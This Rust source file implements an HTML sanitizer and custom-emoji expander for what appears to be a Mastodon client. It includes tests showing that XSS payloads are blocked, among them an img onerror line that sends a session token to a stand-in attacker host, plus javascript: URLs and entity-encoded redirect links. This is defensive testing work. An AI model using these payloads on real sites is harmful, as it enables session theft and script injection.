//! Allowlist HTML sanitizer and safe custom-emoji substitution.
//!
//! Mastodon hands out HTML, and a server or client that prints it as text prints `<br>`.
//! Even when an instance is trusted for the reader's own account, federated statuses, bios,
//! and translations arrive from arbitrary remote servers; interpolating them raw into
//! `inner_html` would hand those servers this origin. `lol-html` rewrites the fragment with
//! an allowlist, so the result is markup this origin chose to keep rather than markup it
//! passed through.
//!
//! What survives is what a post or bio is made of: paragraphs, breaks, emphasis, links,
//! lists, quotes and inline images (custom emoji). Everything else goes, and so does every
//! attribute that is not in [`allowed`] — which removes `style`, `onclick`, and layout
//! classes from remote instances.

use lol_html::html_content::ContentType;
use lol_html::{RewriteStrSettings, doc_comments, doc_text, doctype, element, rewrite_str};
use nodus_client_core::model::{
    Account, Conversation, CustomEmoji, Notification, SearchResults, Status,
};

/// Elements a post or bio may keep. Anything not listed is removed together with its
/// content, so a `<script>` cannot survive as text either.
const KEEP: &[&str] = &[
    "p",
    "br",
    "a",
    "span",
    "strong",
    "em",
    "b",
    "i",
    "u",
    "s",
    "del",
    "ins",
    "code",
    "pre",
    "blockquote",
    "ul",
    "ol",
    "li",
    "h1",
    "h2",
    "h3",
    "h4",
    "img",
];

/// The attributes worth keeping, per element.
fn allowed(tag: &str, name: &str) -> bool {
    matches!(
        (tag, name),
        ("a", "href" | "class" | "rel" | "target" | "title")
            | (
                "img",
                "src" | "alt" | "class" | "title" | "width" | "height"
            )
            | (
                "span" | "p" | "code" | "pre" | "blockquote" | "ul" | "ol" | "li",
                "class"
            )
    )
}

/// Whether a URL is one this page is willing to link to or load as an image.
#[must_use]
pub fn safe_url(url: &str) -> bool {
    let trimmed = url.trim_start();
    if trimmed.chars().any(char::is_control) {
        return false;
    }
    let lower = trimmed.to_ascii_lowercase();
    lower.starts_with("https://")
        || lower.starts_with("http://")
        || (lower.starts_with('/') && !lower.starts_with("//") && !lower.starts_with("/\\"))
}

/// Escapes text for HTML attributes and text nodes.
#[must_use]
pub fn escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for character in text.chars() {
        match character {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            other => out.push(other),
        }
    }
    out
}

/// Decodes HTML character references in attribute strings before URL validation.
///
/// `lol_html` returns raw attribute values without decoding entities, so `/&#x2f;evil.test`,
/// `/&sol;evil.test`, and `/&#92;evil.test` would otherwise look like single-leading-slash
/// paths to [`safe_url`].
fn decode_html_entities(input: &str) -> String {
    if !input.contains('&') {
        return input.to_owned();
    }
    let mut out = String::with_capacity(input.len());
    let mut index = 0_usize;
    let bytes = input.as_bytes();

    while index < bytes.len() {
        if bytes[index] != b'&' {
            let ch = input[index..].chars().next().expect("valid utf8");
            out.push(ch);
            index += ch.len_utf8();
            continue;
        }
        if let Some((decoded, consumed)) = decode_entity_at(&input[index..]) {
            out.push(decoded);
            index += consumed;
        } else {
            out.push('&');
            index += 1;
        }
    }
    out
}

fn decode_entity_at(rest: &str) -> Option<(char, usize)> {
    let after_amp = rest.strip_prefix('&')?;
    if let Some(after_hash) = after_amp.strip_prefix('#') {
        let (radix, digits_str, prefix_len) = if let Some(hex) = after_hash.strip_prefix(['x', 'X'])
        {
            (16_u32, hex, 3_usize)
        } else {
            (10_u32, after_hash, 2_usize)
        };
        let digit_bytes = digits_str
            .bytes()
            .take_while(|byte| match radix {
                16 => byte.is_ascii_hexdigit(),
                _ => byte.is_ascii_digit(),
            })
            .count();
        if digit_bytes == 0 {
            return None;
        }
        let value = u32::from_str_radix(&digits_str[..digit_bytes], radix)
            .ok()
            .filter(|&code| code != 0)
            .and_then(char::from_u32)
            .unwrap_or('\u{FFFD}');
        let semi = usize::from(digits_str.as_bytes().get(digit_bytes) == Some(&b';'));
        return Some((value, prefix_len + digit_bytes + semi));
    }

    let semi = after_amp.find(';')?;
    let name = &after_amp[..semi];
    if name.is_empty() || !name.bytes().all(|byte| byte.is_ascii_alphanumeric()) {
        return None;
    }
    let decoded = match name {
        "sol" => '/',
        "bsol" => '\\',
        "colon" => ':',
        "apos" => '\'',
        "num" => '#',
        "quest" => '?',
        "commat" => '@',
        "percnt" => '%',
        "plus" => '+',
        "equals" => '=',
        "semi" => ';',
        "comma" => ',',
        "period" => '.',
        "excl" => '!',
        "lpar" => '(',
        "rpar" => ')',
        "lsqb" => '[',
        "rsqb" => ']',
        "lcub" => '{',
        "rcub" => '}',
        "lowbar" => '_',
        "hyphen" | "dash" => '-',
        "ast" => '*',
        "verbar" => '|',
        "tilde" => '~',
        _ if name.eq_ignore_ascii_case("tab") => '\t',
        _ if name.eq_ignore_ascii_case("newline") => '\n',
        _ if name.eq_ignore_ascii_case("amp") => '&',
        _ if name.eq_ignore_ascii_case("lt") => '<',
        _ if name.eq_ignore_ascii_case("gt") => '>',
        _ if name.eq_ignore_ascii_case("quot") => '"',
        _ if name.eq_ignore_ascii_case("nbsp") => '\u{00A0}',
        _ => return None,
    };
    Some((decoded, 1 + semi + 1))
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum ScanState {
    Data,
    TagOpen,
    EndTag,
    TagName,
    BeforeAttrName,
    AttrName,
    AfterAttrName,
    BeforeAttrValue,
    AttrValueDouble,
    AttrValueSingle,
    AttrValueUnquoted,
    SelfClosing,
}

impl ScanState {
    fn step(self, byte: u8) -> Self {
        match self {
            Self::Data | Self::AttrValueDouble | Self::AttrValueSingle => match self {
                Self::Data if byte == b'<' => Self::TagOpen,
                Self::AttrValueDouble if byte == b'"' => Self::BeforeAttrName,
                Self::AttrValueSingle if byte == b'\'' => Self::BeforeAttrName,
                _ => self,
            },
            _ if byte == b'>' => Self::Data,
            Self::SelfClosing => Self::BeforeAttrName.step(byte),
            Self::EndTag => Self::EndTag,
            Self::TagOpen => match byte {
                b'/' => Self::EndTag,
                _ if byte.is_ascii_alphabetic() => Self::TagName,
                _ => Self::BeforeAttrName,
            },
            Self::TagName => match byte {
                b'/' => Self::SelfClosing,
                b if b.is_ascii_whitespace() => Self::BeforeAttrName,
                _ => Self::TagName,
            },
            Self::BeforeAttrName | Self::AfterAttrName => match byte {
                b'=' if self == Self::AfterAttrName => Self::BeforeAttrValue,
                b'/' => Self::SelfClosing,
                b if b.is_ascii_whitespace() => self,
                _ => Self::AttrName,
            },
            Self::AttrName => match byte {
                b'/' => Self::SelfClosing,
                b'=' => Self::BeforeAttrValue,
                b if b.is_ascii_whitespace() => Self::AfterAttrName,
                _ => Self::AttrName,
            },
            Self::BeforeAttrValue => match byte {
                b'"' => Self::AttrValueDouble,
                b'\'' => Self::AttrValueSingle,
                b if b.is_ascii_whitespace() => Self::BeforeAttrValue,
                _ => Self::AttrValueUnquoted,
            },
            Self::AttrValueUnquoted => {
                if byte.is_ascii_whitespace() {
                    Self::BeforeAttrName
                } else {
                    Self::AttrValueUnquoted
                }
            }
        }
    }
}

/// Returns the byte offset of a trailing unclosed `<...` tag or open attribute quote at EOF.
fn find_unclosed_tag_start(html: &str) -> Option<usize> {
    let mut state = ScanState::Data;
    let mut tag_start = None;

    for (idx, byte) in html.bytes().enumerate() {
        let was_data = state == ScanState::Data;
        state = state.step(byte);
        if was_data && state != ScanState::Data {
            tag_start = Some(idx);
        } else if state == ScanState::Data {
            tag_start = None;
        }
    }

    (state != ScanState::Data).then_some(tag_start).flatten()
}

/// Rewrites a status body or account bio into markup this origin is willing to render.
///
/// On a rewrite error the escaped text is returned: a post that cannot be sanitised is
/// still readable, and reading beats a blank card.
#[must_use]
pub fn body(html: &str) -> String {
    let settings = RewriteStrSettings {
        document_content_handlers: vec![
            doctype!(|doctype| {
                doctype.remove();
                Ok(())
            }),
            doc_comments!(|comment| {
                comment.remove();
                Ok(())
            }),
            doc_text!(|chunk| {
                if chunk.as_str().contains('<') {
                    let escaped = chunk.as_str().replace('<', "&lt;");
                    chunk.replace(&escaped, ContentType::Html);
                }
                Ok(())
            }),
        ],
        element_content_handlers: vec![element!("*", |el| {
            let tag = el.tag_name();
            if !KEEP.contains(&tag.as_str()) {
                el.remove();
                return Ok(());
            }

            // Collected first: removing while iterating borrows the same element twice.
            let doomed: Vec<String> = el
                .attributes()
                .iter()
                .filter(|attribute| !allowed(&tag, &attribute.name()))
                .map(|attribute| attribute.name().clone())
                .collect();
            for name in doomed {
                el.remove_attribute(&name);
            }

            if tag == "a" {
                let href = el.get_attribute("href").unwrap_or_default();
                let decoded = decode_html_entities(&href);
                if decoded.is_empty() || !safe_url(&decoded) {
                    el.remove_attribute("href");
                } else {
                    // A link out of this page opens in its own tab, and says so.
                    let _ = el.set_attribute("rel", "nofollow noopener noreferrer");
                    let _ = el.set_attribute("target", "_blank");
                }
            }
            if tag == "img" {
                let src = el.get_attribute("src").unwrap_or_default();
                let decoded = decode_html_entities(&src);
                if decoded.is_empty() || !safe_url(&decoded) {
                    el.remove();
                    return Ok(());
                }
                let _ = el.set_attribute("loading", "lazy");
                let _ = el.set_attribute("referrerpolicy", "no-referrer");
                if el.get_attribute("alt").is_none() {
                    let _ = el.set_attribute("alt", "");
                }
            }
            Ok(())
        })],
        ..RewriteStrSettings::default()
    };

    match rewrite_str(html, settings) {
        Ok(mut rewritten) => {
            // `lol_html` emits unclosed `<...` tags/attributes at EOF as raw bytes without
            // running element handlers; drop any incomplete trailing tag so surrounding SSR
            // elements cannot close it into active markup.
            if let Some(unclosed_start) = find_unclosed_tag_start(&rewritten) {
                rewritten.truncate(unclosed_start);
            }
            rewritten
        }
        Err(_) => escape(html),
    }
}

/// Sanitises a status body and expands the custom emoji the status declares in text nodes.
#[must_use]
pub fn prepared(content: &str, emojis: &[CustomEmoji]) -> String {
    with_emojis(&body(content), emojis)
}

/// Expands `:shortcode:` tokens inside HTML text nodes only, never inside tag attributes.
///
/// `html` must already have been sanitised by [`body`] or an escaping renderer such as
/// [`crate::mfm`]. Emoji URLs are checked with [`safe_url`], and replacement happens in a
/// single pass per text node so one emoji's attributes cannot match another emoji's token.
pub(crate) fn with_emojis(html: &str, emojis: &[CustomEmoji]) -> String {
    let entries: Vec<(String, String)> = emojis
        .iter()
        .filter_map(|emoji| {
            if emoji.shortcode.is_empty() {
                return None;
            }
            let source = if emoji.url.is_empty() {
                emoji.static_url.as_deref().unwrap_or_default()
            } else {
                emoji.url.as_str()
            };
            if source.is_empty() || !safe_url(source) {
                return None;
            }
            let token = format!(":{}:", emoji.shortcode);
            let escaped_token = escape(&token);
            let escaped_source = escape(source);
            let replacement = format!(
                "<img class=\"emoji inline-block h-[1.2em] w-auto align-[-0.2em]\" alt=\"{escaped_token}\" title=\"{escaped_token}\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" src=\"{escaped_source}\">"
            );
            Some((token, replacement))
        })
        .collect();

    if entries.is_empty() || !html.contains(':') {
        return html.to_owned();
    }

    let mut text_buf = String::new();
    let mut buffered = false;
    let settings = RewriteStrSettings {
        document_content_handlers: vec![doc_text!(|chunk| {
            if !chunk.last_in_text_node() {
                text_buf.push_str(chunk.as_str());
                buffered = true;
                chunk.remove();
                return Ok(());
            }
            if buffered {
                text_buf.push_str(chunk.as_str());
                let raw_text = std::mem::take(&mut text_buf);
                buffered = false;
                let replaced = expand_emojis_in_text(&raw_text, &entries);
                chunk.replace(replaced.as_deref().unwrap_or(&raw_text), ContentType::Html);
            } else if let Some(replaced) = expand_emojis_in_text(chunk.as_str(), &entries) {
                chunk.replace(&replaced, ContentType::Html);
            }
            Ok(())
        })],
        ..RewriteStrSettings::default()
    };

    rewrite_str(html, settings).unwrap_or_else(|_| html.to_owned())
}

fn expand_emojis_in_text(text: &str, entries: &[(String, String)]) -> Option<String> {
    let mut out = String::new();
    let mut flushed = 0_usize;
    let mut pos = 0_usize;
    let mut changed = false;

    while let Some(rel) = text[pos..].find(':') {
        let colon = pos + rel;
        if let Some((token, replacement)) = entries
            .iter()
            .find(|(token, _)| text[colon..].starts_with(token.as_str()))
        {
            if !changed {
                out.reserve(text.len());
                changed = true;
            }
            out.push_str(&text[flushed..colon]);
            out.push_str(replacement);
            pos = colon + token.len();
            flushed = pos;
        } else {
            pos = colon + 1;
        }
    }

    if !changed {
        return None;
    }
    out.push_str(&text[flushed..]);
    Some(out)
}

/// Sanitises HTML fields on an [`Account`] in place.
pub fn sanitize_account(account: &mut Account) {
    account.note = body(&account.note);
}

/// Sanitises HTML fields on a [`Status`] (including nested `account` and `reblog`) in place.
pub fn sanitize_status(status: &mut Status) {
    status.content = body(&status.content);
    sanitize_account(&mut status.account);
    if let Some(reblog) = status.reblog.as_deref_mut() {
        sanitize_status(reblog);
    }
}

/// Sanitises HTML fields on a [`Notification`] in place.
pub fn sanitize_notification(notification: &mut Notification) {
    sanitize_account(&mut notification.account);
    if let Some(status) = notification.status.as_mut() {
        sanitize_status(status);
    }
}

/// Sanitises HTML fields on a [`Conversation`] in place.
pub fn sanitize_conversation(conversation: &mut Conversation) {
    for account in &mut conversation.accounts {
        sanitize_account(account);
    }
    if let Some(status) = conversation.last_status.as_mut() {
        sanitize_status(status);
    }
}

/// Sanitises HTML fields on [`SearchResults`] in place.
pub fn sanitize_search_results(results: &mut SearchResults) {
    for account in &mut results.accounts {
        sanitize_account(account);
    }
    for status in &mut results.statuses {
        sanitize_status(status);
    }
}

/// Percent-encodes a query-string value so `#` and `@` stay part of the parameter rather than
/// turning into fragments or delimiters.
#[must_use]
pub fn encode_query(text: &str) -> String {
    use std::fmt::Write as _;

    let mut encoded = String::with_capacity(text.len() + 4);
    for byte in text.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                encoded.push(char::from(byte));
            }
            _ => {
                let _ = write!(encoded, "%{byte:02X}");
            }
        }
    }
    encoded
}

#[cfg(test)]
mod tests {
    use super::*;

    fn emoji(shortcode: &str, url: &str) -> CustomEmoji {
        CustomEmoji {
            shortcode: shortcode.to_owned(),
            url: url.to_owned(),
            static_url: None,
        }
    }

    #[test]
    fn paragraphs_and_breaks_survive() {
        let html = body("<p>one</p><p>two<br />three</p>");
        assert!(html.contains("<p>one</p>"), "{html}");
        assert!(html.contains("<br"), "{html}");
    }

    #[test]
    fn links_get_rel_and_target() {
        let html = body("<p><a href=\"https://example.org/x\">x</a></p>");
        assert!(html.contains("href=\"https://example.org/x\""), "{html}");
        assert!(
            html.contains("rel=\"nofollow noopener noreferrer\""),
            "{html}"
        );
        assert!(html.contains("target=\"_blank\""), "{html}");
    }

    #[test]
    fn javascript_urls_lose_their_href() {
        let html = body("<a href=\"javascript:alert(1)\">x</a>");
        assert!(!html.contains("javascript:"), "{html}");
    }

    #[test]
    fn scripts_and_handlers_are_removed() {
        let html = body("<p onclick=\"steal()\">hi<script>alert(1)</script></p>");
        assert!(!html.contains("script"), "{html}");
        assert!(!html.contains("onclick"), "{html}");
        assert!(html.contains("hi"), "{html}");
    }

    #[test]
    fn inline_styles_are_dropped() {
        let html = body("<p style=\"position:fixed\">x</p>");
        assert!(!html.contains("style"), "{html}");
    }

    #[test]
    fn emoji_images_keep_their_source() {
        let html = body("<img src=\"https://example.org/e.png\" alt=\":blob:\">");
        assert!(html.contains("src=\"https://example.org/e.png\""), "{html}");
        assert!(html.contains("referrerpolicy=\"no-referrer\""), "{html}");
    }

    #[test]
    fn prepared_strips_img_onerror_xss() {
        let payload = "<p>hi</p><img src=x onerror=\"fetch('https://attacker.tld/?'+localStorage.getItem('nodus.session'))\">";
        let out = prepared(payload, &[]);
        assert!(!out.contains("onerror"), "{out}");
        assert!(!out.contains("attacker.tld"), "{out}");
        assert!(out.contains("<p>hi</p>"), "{out}");
    }

    #[test]
    fn with_emojis_never_expands_inside_attributes() {
        let html = "<p><a href=\"https://example.com/:wave:\">say :wave:</a></p>";
        let out = prepared(html, &[emoji("wave", "https://cdn.test/wave.png")]);
        assert!(
            out.contains("href=\"https://example.com/:wave:\""),
            "attribute should stay untouched: {out}"
        );
        assert_eq!(
            out.matches("src=\"https://cdn.test/wave.png\"").count(),
            1,
            "text node token should expand once: {out}"
        );
    }

    #[test]
    fn with_emojis_does_not_nest_inside_existing_emoji_img_attributes() {
        let html =
            "<p><img src=\"https://cdn.test/wave.png\" alt=\":wave:\" title=\":wave:\"> :wave:</p>";
        let out = prepared(html, &[emoji("wave", "https://cdn.test/wave.png")]);
        assert!(
            out.contains("alt=\":wave:\""),
            "existing img alt must stay intact: {out}"
        );
        assert_eq!(
            out.matches("src=\"https://cdn.test/wave.png\"").count(),
            2,
            "existing img + expanded text token: {out}"
        );
    }

    #[test]
    fn with_emojis_does_not_chain_replace_across_urls() {
        let emojis = [
            emoji("a", "https://cdn.test/:b:.png"),
            emoji("b", "https://evil.test/b.png"),
        ];
        let out = prepared("<p>:a:</p>", &emojis);
        assert!(out.contains("src=\"https://cdn.test/:b:.png\""), "{out}");
        assert!(!out.contains("evil.test"), "{out}");
    }

    #[test]
    fn with_emojis_rejects_unsafe_urls() {
        let emojis = [
            emoji("bad1", "javascript:alert(1)"),
            emoji("bad2", "data:image/svg+xml,<svg onload=alert(1)>"),
            emoji("bad3", "//evil.test/x.png"),
            CustomEmoji {
                shortcode: "bad4".to_owned(),
                url: String::new(),
                static_url: Some("javascript:alert(2)".to_owned()),
            },
        ];
        let out = prepared("<p>:bad1: :bad2: :bad3: :bad4:</p>", &emojis);
        assert!(!out.contains("<img"), "{out}");
        assert!(out.contains(":bad1: :bad2: :bad3: :bad4:"), "{out}");
    }

    #[test]
    fn with_emojis_escapes_quotes_in_shortcode() {
        let emojis = [emoji("x\" onerror=\"alert(1)", "https://cdn.test/e.png")];
        let out = with_emojis("<p>:x\" onerror=\"alert(1):</p>", &emojis);
        assert!(!out.contains("onerror=\"alert"), "{out}");
        assert!(out.contains("&quot;"), "{out}");
    }

    #[test]
    fn with_emojis_ignores_empty_shortcode() {
        let out = prepared(
            "<p>std::vec::Vec</p>",
            &[emoji("", "https://cdn.test/e.png")],
        );
        assert!(!out.contains("<img"), "{out}");
        assert!(out.contains("std::vec::Vec"), "{out}");
    }

    #[test]
    fn body_drops_unclosed_tag_and_open_attribute_quotes_at_eof() {
        let cases = [
            "<img src=x onerror=\"alert(1)\" ",
            "<img src=x onerror=\"alert(1)\" alt=\"",
            "<img src=x onerror=\"alert(1)\" alt=\"foo>bar",
            "<img/src=x onerror=\"alert(1)\" alt=\"foo>bar",
            "<p>hello</p><img src=x onerror=\"alert(1)\"",
            "<p>hello</p><script src=x",
        ];
        for payload in cases {
            let out = body(payload);
            let wrapped = format!("<span>{out}</span>");
            assert!(
                !wrapped.contains("onerror"),
                "payload `{payload}` -> `{wrapped}`"
            );
            assert!(
                !wrapped.contains("<img"),
                "payload `{payload}` -> `{wrapped}`"
            );
            assert!(
                !wrapped.contains("<script"),
                "payload `{payload}` -> `{wrapped}`"
            );
            assert!(
                wrapped.ends_with("</span>"),
                "payload `{payload}` -> `{wrapped}`"
            );
        }
    }

    #[test]
    fn body_blocks_entity_encoded_protocol_relative_urls() {
        let links = [
            "<a href=\"/&#x2f;evil.test\">x</a>",
            "<a href=\"/&sol;evil.test\">x</a>",
            "<a href=\"/&#92;evil.test\">x</a>",
            "<a href=\"/&#47evil.test\">x</a>",
            "<a href=\"&#x09;/&#x2f;evil.test\">x</a>",
        ];
        for html in links {
            let out = body(html);
            assert!(!out.contains("href="), "link `{html}` kept href: `{out}`");
            assert!(
                !out.contains("evil.test"),
                "link `{html}` leaked host: `{out}`"
            );
        }

        let imgs = [
            "<img src=\"/&#x2f;evil.test/x.png\">",
            "<img src=\"/&sol;evil.test/x.png\">",
            "<img src=\"/&#92;evil.test/x.png\">",
        ];
        for html in imgs {
            let out = body(html);
            assert!(!out.contains("<img"), "img `{html}` survived: `{out}`");
        }

        let safe = body("<a href=\"https://example.com/search?a=1&amp;b=2\">ok</a>");
        assert!(
            safe.contains("href=\"https://example.com/search?a=1&amp;b=2\""),
            "{safe}"
        );
    }
}
